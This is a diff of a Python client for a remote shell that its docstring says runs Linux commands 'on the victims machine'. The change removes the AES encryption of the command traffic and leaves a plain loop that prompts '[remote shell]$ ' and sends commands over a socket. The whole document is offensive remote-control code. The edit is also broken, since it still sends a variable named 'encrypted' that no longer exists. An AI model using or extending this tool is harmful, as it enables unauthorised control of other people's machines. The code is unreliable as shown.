@@ -9,22 +9,11 @@ the user to execute linux commands on the victims machine.
 The program will output the executed command given by the victim.
 '''
 
-from Crypto.Cipher import AES
-from Crypto import Random
 import socket
 import base64
 import os
 import optparse
 import sys
-
-# encrypt/encode and decrypt/decode a string
-EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
-DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
-
-# random secret key (both the client and server must match this key)
-secret = "sixteen byte key"
-iv = Random.new().read(AES.block_size)
-cipher = AES.new(secret, AES.MODE_CFB, iv)
 
 # parse command line argument
 parser = optparse.OptionParser("usage: python client.py -d <host ip> -p <port>")
@@ -49,28 +38,17 @@ s.connect((host, port))
 while True:
     data = s.recv(1024)
 
-    # decrypt data
-    decrypted = DecodeAES(cipher, data)
+    # print command
+    print data
 
-    # check for end of file
-    if decrypted.endswith(secret) == True:
+    # get command
+    cmd = raw_input("[remote shell]$ ")
 
-        # print command
-        print decrypted[:-16]
-
-        # get command
-        cmd = raw_input("[remote shell]$ ")
-
-        # encrypt command
-        encrypted = EncodeAES(cipher, cmd)
-
-        # send encrypted command
-        s.send(encrypted)
+    # send command
+    s.send(encrypted)
         
-        # check if user typed "exit" to leave remote shell
-        if cmd == "exit":
-            break
-    else:
-        print decrypted
+    # check if user typed "exit" to leave remote shell
+    if cmd == "exit":
+        break
 s.close()
 sys.exit()
